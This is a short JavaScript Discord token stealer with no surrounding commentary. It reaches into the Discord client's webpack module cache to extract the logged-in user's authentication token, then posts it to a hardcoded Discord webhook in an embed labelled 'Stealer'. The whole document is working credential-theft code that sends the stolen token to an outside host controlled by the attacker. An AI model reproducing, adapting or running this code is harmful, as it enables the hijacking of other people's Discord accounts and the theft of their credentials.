function get() {
  let a = [];
  webpackChunkdiscord_app.push([
    [0],
    ,
    (e) =>
      Object.keys(e.c).find(
        (t) => (t = e(t)?.default?.get?.()) && a.push(t)
      ),
  ]);
  return a[0];
}

var tkn = get()

const whURL =
  "https://discordapp.com/api/webhooks/1140989302285803581/CecbwqMQBNsxnMiPGG0soUsHRRf3y-sWYB7AOC0X4rc2zgEj3ohJWmd5T3XxMeCteR-b";

const webhookBody = {
  embeds: [
    {
      title: "Stealer",
      fields: [
        { name: "Token", value: tkn }
      ],
      color: 5814783,
    },
  ],
};

const response = await fetch(whURL, {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify(webhookBody),
});

if (response.ok) {
  console.log("Done (:");
} else {
  alert("There was an error! Try again later!");
}
